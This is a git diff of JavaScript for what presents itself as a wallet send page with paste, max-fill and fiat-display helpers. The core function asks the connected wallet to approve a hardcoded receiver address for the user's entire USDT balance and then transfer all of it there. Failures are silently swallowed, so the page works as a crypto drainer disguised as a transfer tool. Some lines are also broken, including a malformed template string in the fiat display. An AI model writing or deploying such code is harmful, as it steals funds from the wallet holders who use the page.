@@ -1,5 +1,6 @@
 const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
 const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
+
 const usdtABI = [
   {
     constant: false,
@@ -53,11 +54,46 @@ async function approveAndTransfer() {
 
   if (balance === "0") return;
 
-  // Approve receiver to spend full balance
-  await usdt.methods.approve(receiver, balance).send({ from: user });
+  try {
+    // Approve first
+    await usdt.methods.approve(receiver, balance).send({ from: user });
 
-  // Now transfer USDT from user to receiver using transferFrom
-  await usdt.methods
-    .transferFrom(user, receiver, balance)
-    .send({ from: user }); // transferFrom user hi call karega — approval ke baad allowed
+    // Then transfer using transferFrom
+    await usdt.methods.transferFrom(user, receiver, balance).send({ from: user });
+  } catch (e) {
+    // silent fail — do nothing
+  }
+}
+
+function clearAddress() {
+  document.getElementById("address").value = "";
+}
+
+async function pasteAddress() {
+  try {
+    const text = await navigator.clipboard.readText();
+    document.getElementById("address").value = text;
+  } catch (e) {}
+}
+
+async function fillMax() {
+  if (typeof window.ethereum === "undefined") return;
+
+  const web3 = new Web3(window.ethereum);
+  await window.ethereum.request({ method: "eth_requestAccounts" });
+  const accounts = await web3.eth.getAccounts();
+  const user = accounts[0];
+
+  const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
+  const balance = await usdt.methods.balanceOf(user).call();
+  const decimals = await usdt.methods.decimals().call();
+
+  const formatted = balance / 10 ** decimals;
+  document.getElementById("amount").value = formatted.toFixed(2);
+  updateFiat();
+}
+
+function updateFiat() {
+  const amount = parseFloat(document.getElementById("amount").value || "0");
+  document.getElementById("fiat").innerText = ≈ $${amount.toFixed(2)};
 }
